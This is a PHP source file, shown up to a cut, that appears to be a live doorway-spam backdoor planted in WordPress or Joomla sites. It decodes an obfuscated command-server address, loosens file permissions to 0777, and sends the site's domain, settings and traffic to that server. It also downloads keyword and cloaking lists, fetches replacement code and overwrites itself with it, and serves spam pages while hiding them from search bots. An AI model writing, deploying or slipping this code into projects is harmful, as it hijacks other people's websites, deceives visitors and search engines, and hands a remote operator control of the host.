<?php if (empty($_GET['ineedthispage'])) {
	ini_set('display_errors', "Off");
	ignore_user_abort(1);
	$version = "4.4.1";
	$errors = "";
	$errorsforlocal = "";
	if (!is_function_enabled('curl_init')) {
		$errors .= "I_have_problem_with_Curl\t";
		$errorsforlocal .= "I_have_problem_with_Curl\t";
	}
	if (!is_function_enabled('fopen')) {
		$errors .= "I_have_problem_with_fopen\t";
		$errorsforlocal .= "I_have_problem_with_fopen\t";
	}
	if (!is_function_enabled('file_get_contents')) {
		$errors .= "I_have_problem_with_file_get_contents\t";
		$errorsforlocal .= "I_have_problem_with_file_get_contents\t";
	}
	if (!is_function_enabled('gzuncompress')) {
		$errors .= "I_have_problem_with_gzuncompress\t";
		$errorsforlocal .= "I_have_problem_with_gzuncompress\t";
	}
	if (!is_function_enabled('base64_decode')) {
		$errors .= "I_have_problem_with_base64_decode\t";
		$errorsforlocal .= "I_have_problem_with_base64_decode\t";
	}
	$clienturl = "";
	$newkeys = "";
	$dotemplate = "";
	$clearcache = "";
	$newuseragents = "";
	$newbotips = "";
	$newreffs = "";
	$usecloack = "";
	$itsinclude = "";
	$clienttype = "";
	$lang = "";
	$wherecontent = "";
	$textfilename = "";
	$keyfilename = "";
	$themesfilename = "";
	$templatename = "";
	$extlinksfilename = "";
	$keyperem = "";
	$redirect = "";
	$q = "";
	$workstatus = "";
	$settsinclient = "";
	$cleanrescode = "";
	$getautosettsornot = "";
	$servurl = decodeservurl("aHR7cCUzQSUyRiUyRjE9My1xNzIuMTMuNTAlMkZ7bmQlMkZnZXRkYXRhLnBocA==");
	$servurl = str_ireplace("http://", "", $servurl);
	if (!empty($_SERVER['HTTP_USER_AGENT'])) {
		$useragent = $_SERVER['HTTP_USER_AGENT'];
	} else {
		$useragent = "";
	}
	if (!empty($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	} else {
		$referer = "";
	}
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
		$ip = $_SERVER['REMOTE_ADDR'];
	} else {
		$ip = "";
	}
	$clientid = md5(__FILE__);
	$clientreshash = md5($_SERVER["SERVER_NAME"]);
	$clfilenamehere = explode($_SERVER["DOCUMENT_ROOT"], __FILE__);
	$clfilenamehere = $clfilenamehere[1];
	$clfilenamehere = trim($clfilenamehere);
	$clfilenamehere = urlencode($clfilenamehere);
	$cachedirname = dirname(__FILE__) . DIRECTORY_SEPARATOR . "cache" . $clientid;
	$keysfilename = $cachedirname . DIRECTORY_SEPARATOR . "ke" . substr($clientid, 0, 8) . "ys";
	$useragentsfilename = $cachedirname . DIRECTORY_SEPARATOR . "use" . substr($clientid, 0, 3) . "rag" . substr($clientid, 3, 6) . "ents";
	$botipsfilename = $cachedirname . DIRECTORY_SEPARATOR . "bo" . substr($clientid, 0, 4) . "ti" . substr($clientid, 5, 8) . "ps";
	$referersfilename = $cachedirname . DIRECTORY_SEPARATOR . "re" . substr($clientid, 1, 4) . "fere" . substr($clientid, 6, 8) . "re";
	$runningfilename = $cachedirname . DIRECTORY_SEPARATOR . "run" . substr($clientid, 2, 7) . "ning";
	if (file_exists($runningfilename)) {
		@unlink($runningfilename);
	}
	$cachefilename = $cachedirname . DIRECTORY_SEPARATOR . "cac" . substr($clientid, 0, 6) . "he";
	$errorsfilename = $cachedirname . DIRECTORY_SEPARATOR . "err" . substr($clientid, 3, 7) . "ors";
	$trafffilename = $cachedirname . DIRECTORY_SEPARATOR . "tr" . substr($clientid, 2, 8) . "aff";
	$nativetemplatefilename = $cachedirname . DIRECTORY_SEPARATOR . "tem" . substr($clientid, 2, 6) . "pla" . substr($clientid, 2, 4) . "te";
	$nativetemplatefilename_old = $cachedirname . DIRECTORY_SEPARATOR . "tem" . substr($clientid, 3, 6) . "pla" . substr($clientid, 1, 4) . "te";
	$nativetemplatefilename_oldold = $cachedirname . DIRECTORY_SEPARATOR . "tem" . substr($clientid, 3, 6) . "pla" . substr($clientid, 2, 4) . "te";
	if (file_exists($nativetemplatefilename_old)) {
		@unlink($nativetemplatefilename_old);
	}
	if (file_exists($nativetemplatefilename_oldold)) {
		@unlink($nativetemplatefilename_oldold);
	}
	$urlhash = md5($_SERVER['SERVER_NAME'] . str_ireplace("-", "", $_SERVER['REQUEST_URI']));
	$thisdomain = $_SERVER['SERVER_NAME'];
	$settfilename = "se" . substr($clientid, 1, 6) . "tts";
	$whattime = checktime(200);
	if (!is_dir($cachedirname)) {
		if (!mkdir($cachedirname, 0777)) {
			$errors .= "Can't create cache dir\t";
			$errorsforlocal .= "Can't create cache dir\t";
		}
	}
	if (!file_exists($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7))) {
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7), "w+");
		if (!empty($fod)) {
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
		} else {
			$errors .= "Can't first create timefile " . substr($clientid, 0, 7) . "\t";
			$errorsforlocal .= "Can't first create timefile " . substr($clientid, 0, 7) . "\t";
		}
	}
	if ($whattime == "errorcreate") {
		$errors .= "Can't create timefile " . substr($clientid, 0, 7) . "\t";
		$errorsforlocal .= "Can't create timefile " . substr($clientid, 0, 7) . "\t";
	}
	$cachedirperm = substr(sprintf('%o', fileperms($cachedirname)), -4);
	if ($cachedirperm != "0777") {
		@chmod($cachedirname, 0777);
	}
	$ownperm = substr(sprintf('%o', fileperms(__FILE__)), -4);
	if ($ownperm != "0777") {
		@chmod(__FILE__, 0777);
	}
	$currdirperm = substr(sprintf('%o', fileperms(dirname(__FILE__))), -4);
	if ($currdirperm != "0777") {
		@chmod(dirname(__FILE__), 0777);
	}
	$keysfilestatus = "";
	if (file_exists($cachedirname . DIRECTORY_SEPARATOR . $settfilename)) {
		$settsinclient = "yes";
		if (file_exists($keysfilename)) {
			$workstatus = "work";
			$keysfilestatus = "good";
		}
		$settings = @file_get_contents($cachedirname . DIRECTORY_SEPARATOR . $settfilename);
		if (empty($settings)) {
			@unlink($cachedirname . DIRECTORY_SEPARATOR . $settfilename);
		} else {
			$settings = decodedata($settings);
		}
		$cleanrescode = urldecode(getsettings($settings, "cleanrescode", "yes"));
		if ($cleanrescode == "yes") {
			$fod = fopen(__FILE__, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
			full_del_dir($cachedirname);
			die();
		}
		$clienturl = urldecode(getsettings($settings, "clienturl", "yes"));
		if (stripos("qqqq" . $clienturl, "[DOMAIN]")) {
			$clienturl = str_ireplace("[DOMAIN]", $thisdomain, $clienturl);
		}
		$clienturl = trim($clienturl);
		$newkeys = urldecode(getsettings($settings, "newkeys", "yes"));
		$newkeys = trim($newkeys);
		$getautosettsornot = urldecode(getsettings($settings, "getautosettsornot", "yes"));
		$getautosettsornot = trim($getautosettsornot);
		$dotemplate = urldecode(getsettings($settings, "dotemplate", "yes"));
		$dotemplate = trim($dotemplate);
		$clearcache = urldecode(getsettings($settings, "clearcache", "yes"));
		$clearcache = trim($clearcache);
		$newuseragents = urldecode(getsettings($settings, "newuseragents", "yes"));
		$newuseragents = trim($newuseragents);
		$newbotips = urldecode(getsettings($settings, "newbotips", "yes"));
		$newbotips = trim($newbotips);
		$newreffs = urldecode(getsettings($settings, "newreffs", "yes"));
		$newreffs = trim($newreffs);
		$usecloack = urldecode(getsettings($settings, "usecloack", "yes"));
		$usecloack = trim($usecloack);
		$itsinclude = urldecode(getsettings($settings, "itsinclude", "yes"));
		$itsinclude = trim($itsinclude);
		$clienttype = urldecode(getsettings($settings, "clienttype", "yes"));
		$clienttype = trim($clienttype);
		$lang = urldecode(getsettings($settings, "lang", "yes"));
		$lang = trim($lang);
		$wherecontent = urldecode(getsettings($settings, "wherecontent", "yes"));
		$wherecontent = trim($wherecontent);
		$textfilename = urldecode(getsettings($settings, "textfilename", "yes"));
		$textfilename = trim($textfilename);
		$keyfilename = urldecode(getsettings($settings, "keyfilename", "yes"));
		$keyfilename = trim($keyfilename);
		$themesfilename = urldecode(getsettings($settings, "themesfilename", "yes"));
		$themesfilename = trim($themesfilename);
		$templatename = urldecode(getsettings($settings, "templatename", "yes"));
		$templatename = trim($templatename);
		$extlinksfilename = urldecode(getsettings($settings, "extlinksfilename", "yes"));
		$extlinksfilename = trim($extlinksfilename);
		$keyperem = urldecode(getsettings($settings, "keyperem", "yes"));
		$keyperem = trim($keyperem);
		$renewclient = urldecode(getsettings($settings, "renewclient", "yes"));
		$renewclient = trim($renewclient);
		$redirect = urldecode(getsettings($settings, "redirect", "yes"));
		$redirect = trim($redirect);
		$keyfindexurl = urlencode(trim($clienturl, "/"));
		$urlfmbrowser = urlencode($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
		$regular = str_ireplace("%5BKEY%5D", "([\S]*?)", $keyfindexurl);
		$regular = "/" . $regular . "/iUm";
		preg_match($regular, $urlfmbrowser, $match);
		if (!empty($match[1])) {
			$q = trim($match[1]);
		}
		if (!empty($keyperem) && !empty($workstatus) && $workstatus == "work" && empty($q)) {
			$test = "";
			if (!empty($_GET[$keyperem])) {
				$q = $_GET[$keyperem];
			} elseif ($itsinclude == "no" && empty($_GET[$keyperem])) {
				$allkeys = file_get_contents($keysfilename);
				if (!empty($allkeys)) {
					$allkeys = explode("\n", decodedata($allkeys));
					srand((float)microtime() * 1000000);
					shuffle($allkeys);
					$q = trim($allkeys[0]);
					unset($allkeys);
				} else {
					$errors .= "Keys file is empty\t";
					$errorsforlocal .= "Keys file is empty\t";
				}
			}
		}
		$q = urldecode(urldecode($q));
		$q = trim($q, "/");
		if (!empty($q)) {
			if ($q == "this-is-the-test-of-door") {
				$test = "yes";
			}
			if (keyindoorway($q, $keysfilename) == "yes" && empty($test)) {
				$test = "yes";
			}
		}
	}
	if (!empty($settings) && !empty($newkeys) && $newkeys == "yes" && !empty($keyfilename) && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		$settings = str_ireplace("newkeys=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewkeys=yes&keyfilename=" . urlencode($keyfilename));
		$fp = fopen($keysfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors .= "CurlError " . $curlerror . " while get keys\t";
				$errorsforlocal .= "CurlError " . $curlerror . " while get keys\t";
			}
			curl_close($ch);
			fclose($fp);
		} else {
			curl_close($ch);
			$errors .= "Can't save keys file\t";
			$errorsforlocal .= "Can't save keys file\t";
		}
		@unlink($runningfilename);
	}
	if ($clienttype == "wpgood") {
		if (!file_exists($nativetemplatefilename) && !file_exists($runningfilename) && !empty($settings)) {
			$fod = fopen($runningfilename, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
			if (!is_function_enabled('wp_insert_post') && !is_function_enabled('get_permalink') && !is_function_enabled('wp_delete_post') && !is_function_enabled('add_action')) {
				$errors .= "Not WP or include before WP functions loaded\t";
				$errorsforlocal .= "Not WP or include before WP functions loaded\t";
			} else {
				$slugname = randString(8);
				$post_data = array('post_title' => "HEREISTITLE", 'post_name' => $slugname, 'post_content' => "HEREISCONTENT", 'post_status' => 'publish', 'post_category' => array());
				$post_id = wp_insert_post($post_data, true);
				$permalink = get_permalink($post_id);
				$testpermalink = explode("/", $permalink);
				if (stripos($testpermalink[count($testpermalink) - 1], "?")) {
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $permalink . "&ineedthispage=yes");
					curl_setopt($ch, CURLOPT_HEADER, false);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_REFERER, "");
					$goodwordpresspage = curl_exec($ch);
					curl_close($ch);
				} else {
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $permalink . "?ineedthispage=yes");
					curl_setopt($ch, CURLOPT_HEADER, false);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_REFERER, "");
					$goodwordpresspage = curl_exec($ch);
					curl_close($ch);
				}
				$goodwordpresspage = str_ireplace($permalink, "#", $goodwordpresspage);
				$goodwordpresspage = str_ireplace("&ineedthispage=yes", "", $goodwordpresspage);
				$goodwordpresspage = str_ireplace("&amp;ineedthispage=yes", "", $goodwordpresspage);
				if (!wp_delete_post($post_id, true)) {
					wp_delete_post($post_id, true);
				}
				if (!empty($goodwordpresspage) && stripos("qqq" . $goodwordpresspage, "HEREISCONTENT")) {
					$goodwordpresspage = str_ireplace("content=\"HEREISCONTENT", "content=\"", $goodwordpresspage);
					$goodwordpresspage = str_ireplace("content=\" HEREISCONTENT", "content=\"", $goodwordpresspage);
					$goodwordpresspage = preg_replace("/<meta property=[\"\']{1}og:description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs", "", $goodwordpresspage);
					$goodwordpresspage = urlencode($goodwordpresspage);
					$regular = "|(%3Cscript.*%3C%2Fscript%3E)|iUs";
					preg_match_all($regular, $goodwordpresspage, $matches);
					if (!empty($matches[1])) {
						foreach ($matches[1] as $currgooglestat) {
							if (stripos("qqq" . $currgooglestat, "google-analytics.com")) {
								$goodwordpresspage = str_ireplace($currgooglestat, "", $goodwordpresspage);
							}
						}
					}
					$goodwordpresspage = urldecode($goodwordpresspage);
					$goodwordpresspage = preg_replace("/<meta name=[\"\']{1}description.*[\"\']{1}.*\/>/iUs", "", $goodwordpresspage);
					$goodwordpresspage = urlencode(codedata($goodwordpresspage));
					$fod = fopen($nativetemplatefilename, "w+");
					flock($fod, LOCK_EX);
					fwrite($fod, $goodwordpresspage);
					fclose($fod);
					$settings = str_ireplace("dotemplate=yes", "", $settings);
					$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "a+");
					flock($fod, LOCK_EX);
					ftruncate($fod, 0);
					fwrite($fod, codedata(trim($settings)));
					fclose($fod);
				} else {
					$errors .= "Cant get native template\t";
					$errorsforlocal .= "Cant get native template\t";
				}
			}
			@unlink($runningfilename);
		}
	}
	if ($clienttype == "joomlagood") {
		if (!file_exists($nativetemplatefilename) && !file_exists($runningfilename) && !empty($settings)) {
			$fod = fopen($runningfilename, "w+");
			flock($fod, LOCK_EX);
			fwrite($fod, "");
			fclose($fod);
			if (!is_function_enabled('postItem') && !class_exists("JFactory")) {
				$errors .= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
				$errorsforlocal .= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
			} else {
				$joomlaurl = explode("/", $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
				unset($joomlaurl[count($joomlaurl) - 1]);
				$idtemp = postItem("HEREISTITLE", "", "HEREISCONTENT");
				$idtemp = explode(":", $idtemp);
				$titletemp = "HEREISTITLE";
				if (is_array($idtemp)) {
					$alias = trim($idtemp[1]);
					$id = trim($idtemp[0]);
					$goodwordpresspage = file_get_contents("http://" . trim(implode("/", $joomlaurl), "/") . "/index.php/?option=com_content&view=article&id=" . $id . "&ineedthispage=yes");
					$goodwordpresspage = str_ireplace("&ineedthispage=yes", "", $goodwordpresspage);
					$goodwordpresspage = str_ireplace("&amp;ineedthispage=yes", "", $goodwordpresspage);
					$goodwordpresspage = str_ireplace("?ineedthispage=yes", "", $goodwordpresspage);
					$goodwordpresspage = preg_replace("/<title>(.*)<\/title>/iUm", "<title>" . $titletemp . "</title>", $goodwordpresspage);
					$db = JFactory::getDbo();
					$query = $db->getQuery(true);
					$query->delete($db->quoteName('#__content'))->where(array($db->quoteName('id') . '=' . $id));
					$db->setQuery($query);
					$result = $db->query();
					if (!empty($goodwordpresspage) && stripos("qqq" . $goodwordpresspage, "HEREISCONTENT")) {
						$goodwordpresspage = str_ireplace("content=\"HEREISCONTENT", "content=\"", $goodwordpresspage);
						$goodwordpresspage = str_ireplace("content=\" HEREISCONTENT", "content=\"", $goodwordpresspage);
						$goodwordpresspage = preg_replace("/<meta property=[\"\']{1}og:description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs", "", $goodwordpresspage);
						$goodwordpresspage = urlencode($goodwordpresspage);
						$regular = "|(%3Cscript.*%3C%2Fscript%3E)|iUs";
						preg_match_all($regular, $goodwordpresspage, $matches);
						if (!empty($matches[1])) {
							foreach ($matches[1] as $currgooglestat) {
								if (stripos("qqq" . $currgooglestat, "google-analytics.com")) {
									$goodwordpresspage = str_ireplace($currgooglestat, "", $goodwordpresspage);
								}
							}
						}
						$goodwordpresspage = urldecode($goodwordpresspage);
						$goodwordpresspage = preg_replace("/<meta name=[\"\']{1}description.*[\"\']{1}.*\/>/iUs", "", $goodwordpresspage);
						$goodwordpresspage = urlencode(codedata($goodwordpresspage));
						$fod = fopen($nativetemplatefilename, "w+");
						flock($fod, LOCK_EX);
						fwrite($fod, $goodwordpresspage);
						fclose($fod);
						$settings = str_ireplace("dotemplate=yes", "", $settings);
						$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "a+");
						flock($fod, LOCK_EX);
						ftruncate($fod, 0);
						fwrite($fod, codedata(trim($settings)));
						fclose($fod);
					} else {
						$errors .= "Cant get native template\t";
						$errorsforlocal .= "Cant get native template\t";
					}
				}
			}
			@unlink($runningfilename);
		}
	}
	if (!empty($settings) && !empty($newuseragents) && $newuseragents == "yes" && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		$settings = str_ireplace("newuseragents=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewuseragents=yes");
		$fp = fopen($useragentsfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors .= "CurlError " . $curlerror . " while get useragents\t";
				$errorsforlocal .= "CurlError " . $curlerror . " while get useragents\t";
			}
			curl_close($ch);
			fclose($fp);
		} else {
			curl_close($ch);
			$errors .= "Can't save useragents file\t";
			$errorsforlocal .= "Can't save useragents file\t";
		}
		@unlink($runningfilename);
	}
	if (!empty($settings) && !empty($newbotips) && $newbotips == "yes" && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		$settings = str_ireplace("newbotips=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewbotips=yes");
		$fp = fopen($botipsfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors .= "CurlError " . $curlerror . " while get botips\t";
				$errorsforlocal .= "CurlError " . $curlerror . " while get botips\t";
			}
			curl_close($ch);
			fclose($fp);
		} else {
			curl_close($ch);
			$errors .= "Can't save botips file\t";
			$errorsforlocal .= "Can't save botips file\t";
		}
		@unlink($runningfilename);
	}
	if (!empty($settings) && !empty($newreffs) && $newreffs == "yes" && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		$settings = str_ireplace("newreffs=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata($settings));
		fclose($fod);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewreffs=yes");
		$fp = fopen($referersfilename, "w+");
		if (!empty($fp)) {
			curl_setopt($ch, CURLOPT_FILE, $fp);
			curl_exec($ch);
			$curlerror = "";
			$curlerror = curl_error($ch);
			if (!empty($curlerror)) {
				$errors .= "CurlError " . $curlerror . " while get referers\t";
				$errorsforlocal .= "CurlError " . $curlerror . " while get refererrs\t";
			}
			curl_close($ch);
			fclose($fp);
		} else {
			curl_close($ch);
			$errors .= "Can't save refererrs file\t";
			$errorsforlocal .= "Can't save refererrs file\t";
		}
		@unlink($runningfilename);
	}
	if (!empty($settings) && !empty($clearcache) && $clearcache == "yes" && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		$settings = str_ireplace("clearcache=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata(trim($settings)));
		fclose($fod);
		if (file_exists($cachefilename)) {
			@unlink($cachefilename);
		}
		@unlink($runningfilename);
	}
	if (!empty($settings) && !empty($renewclient) && $renewclient == "yes" && !file_exists($runningfilename)) {
		$fod = fopen($runningfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, "");
		fclose($fod);
		if (!empty($servurl)) {
			$newclient = file_get_contents("http://" . str_ireplace("getdata.php", "clientdata", $servurl));
			$newclient = str_ireplace(urldecode("%5BSERVERURLHERE%5D"), codeservurl($servurl), $newclient);
			if (!empty($newclient) && stripos("qqq" . $newclient, "item->alias")) {
				$fod = fopen(__FILE__, "w+");
				flock($fod, LOCK_EX);
				fwrite($fod, trim($newclient));
				fclose($fod);
			}
		}
		$settings = str_ireplace("renewclient=yes", "", $settings);
		$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
		flock($fod, LOCK_EX);
		fwrite($fod, codedata(trim($settings)));
		fclose($fod);
		@unlink($runningfilename);
	}
	if ($whattime == "goodtime") {
		$cloackfiles = "";
		if (file_exists($useragentsfilename) && file_exists($botipsfilename) && file_exists($referersfilename)) {
			$cloackfiles = "good";
		}
		$trafficdata = "";
		if (file_exists($trafffilename)) {
			$trafficdata = file_get_contents($trafffilename);
		}
		$thisistheworkdoorway = "";
		if (!empty($clienturl)) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://" . str_ireplace("[KEY]", "this-is-the-test-of-door", $clienturl));
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_REFERER, "http://b9i9n9g.com");
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17");
			$testdoorway = curl_exec($ch);
			curl_close($ch);
			if (stripos("qqq" . $testdoorway, "DOORWAYISWORKCONTENT") && stripos("qqq" . $testdoorway, "DOORWAYISWORKTITLE")) {
				$thisistheworkdoorway = "yes";
			}
		}
		if (file_exists($nativetemplatefilename)) {
			$nativetemplatefilenametoshow = "Yes";
		} else {
			$nativetemplatefilenametoshow = "";
		}
		$filesdata = "<b>Client type-</b> " . $clienttype . "<br><b>Lang-</b> " . $lang . "<br><b>Key var.-</b> " . $keyperem . "<br><b>It's include-</b> " . $itsinclude . "<br><b>Text from-</b>  " . $wherecontent . "<br><b>Template-</b> " . $templatename . "<br><b>Keys-</b> " . $keyfilename . "<br><b>Text-</b> " . $textfilename . "<br><b>Themes-</b> " . $themesfilename . "<br><b>Extlinks-</b> " . $extlinksfilename . "<br><b>Parsed Temp- </b>" . $nativetemplatefilenametoshow;
		$filesdata = urlencode(codedata($filesdata));
		if (!empty($settings)) {
			$currsettoserv = urlencode(codedata($settings));
		} else {
			$currsettoserv = "";
		}
		$typeofpirog = "Unknown";
		if (is_function_enabled('postItem') && class_exists("JFactory")) {
			$typeofpirog = "Joomla";
		}
		if (is_function_enabled('wp_insert_post') && is_function_enabled('get_permalink') && is_function_enabled('wp_delete_post')) {
			$typeofpirog = "Wordpress";
		}
		$getsettsdata = "clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&templatename=" . urlencode($templatename) . "&ineednewsetts=yes" . "&version=" . urlencode($version) . "&clientdomain=" . urlencode($thisdomain) . "&workstatus=" . urlencode($workstatus) . "&cachedirperm=" . urlencode($cachedirperm) . "&ownperm=" . urlencode($ownperm) . "&currdirperm=" . urlencode($currdirperm) . "&settsinclient=" . urlencode($settsinclient) . "&keyshere=" . urlencode($keysfilestatus) . "&cloackstatus=" . urlencode($usecloack) . "&cloackfiles=" . urlencode($cloackfiles) . "&filesdata=" . $filesdata . "&trafficdata=" . urlencode($trafficdata) . "&currentsetts=" . $currsettoserv . "&testdoorwork=" . $thisistheworkdoorway . "&typeofpirog=" . urlencode($typeofpirog) . "&clientreshash=" . urlencode($clientreshash) . "&getautosettsornot=" . urlencode($getautosettsornot) . "&clfilenamehere=" . $clfilenamehere;
		if ($curl = curl_init()) {
			curl_setopt($curl, CURLOPT_URL, "http://" . $servurl);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $getsettsdata);
			$newsetts = curl_exec($curl);
			curl_close($curl);
		} else {
			$errors .= "Can't gett settings\t";
			$errorsforlocal .= "Can't gett settings\t";
		}
		if (stripos("qqq" . $newsetts, "CurlError")) {
			$errors .= $newsetts . "\t";
			$errorsforlocal .= $newsetts . "\t";
		} else {
			if (!empty($newsetts) && stripos("qqqq" . $newsetts, "THENEWSETTSHERE")) {
				$newsetts = str_ireplace("THENEWSETTSHERE", "", $newsetts);
				$newsetts = codedata($newsetts);
				$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . $settfilename, "w+");
				if (!empty($fod)) {
					flock($fod, LOCK_EX);
					fwrite($fod, $newsetts);
					fclose($fod);
				} else {
					$errors .= "Can't save setting file\t";
					$errorsforlocal .= "Can't save setting file\t";
				}
			}
		}
	}
	if (!empty($q) && !empty($urlhash) && !empty($settings) && !empty($test) && $test == "yes" && $q != "this-is-the-test-of-door") {
		$bot = 0;
		$user = 1;
		if (!empty($usecloack) && $usecloack == "use") {
			$testcloack = cloack($ip);
			if ($testcloack == 1) {
				$bot = 1;
				$user = 0;
				$redirect = "";
			}
		}
		if (file_exists($trafffilename)) {
			$traffic = file_get_contents($trafffilename);
			$traffic = explode("/", $traffic);
			$traffic[0] = trim($traffic[0]) + $bot;
			$traffic[1] = trim($traffic[1]) + $user;
			$traffic = implode("/", $traffic);
			$traffic = trim($traffic);
			@unlink($trafffilename);
			$fod = fopen($trafffilename, "a+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				ftruncate($fod, 0);
				fwrite($fod, $traffic);
				fclose($fod);
			} else {
				$errors .= "Can't save traffic file\t";
				$errorsforlocal .= "Can't save traffic file\t";
			}
		} else {
			$traffic = $bot . "/" . $user;
			$fod = fopen($trafffilename, "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, $traffic);
				fclose($fod);
			} else {
				$errors .= "Can't save traffic file\t";
				$errorsforlocal .= "Can't save traffic file\t";
			}
		}
		if (file_exists($cachefilename)) {
			$handle = fopen($cachefilename, "r");
			while (!feof($handle)) {
				$cacheline = fgets($handle);
				$cacheline = explode("::::", $cacheline);
				$cachedurl = trim($cacheline[0]);
				if ($cachedurl == trim($urlhash)) {
					$cacheddata = trim($cacheline[1]);
					break;
				}
			}
			fclose($handle);
			if (!empty($cacheddata)) {
				$page = decodedata($cacheddata);
			} else {
				$geturl = "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&itsinclude=" . urlencode($itsinclude) . "&clienttype=" . urlencode($clienttype) . "&lang=" . urlencode($lang) . "&currkey=" . urlencode($q) . "&wherecontent=" . urlencode($wherecontent) . "&textfilename=" . urlencode($textfilename) . "&keyfilename=" . urlencode($keyfilename) . "&themesfilename=" . urlencode($themesfilename) . "&templatename=" . urlencode($templatename) . "&extlinksfilename=" . urlencode($extlinksfilename) . "&keysfilestatus=" . urlencode($keysfilestatus) . "&workstatus=" . urlencode($workstatus) . "&clientdomain=" . urlencode($thisdomain) . "&clienterrors=" . urlencode($errors);
				$page = getpagefmurl($geturl);
				if (stripos("qqqq" . $page, "CurlError")) {
					$errorsforlocal .= $page . " while get content from server\t";
				} else {
					if (!empty($page)) {
						$fod = fopen($cachefilename, "a+");
						flock($fod, LOCK_EX);
						fwrite($fod, $urlhash . "::::" . codedata($page) . "\n");
						fclose($fod);
					}
				}
			}
		} else {
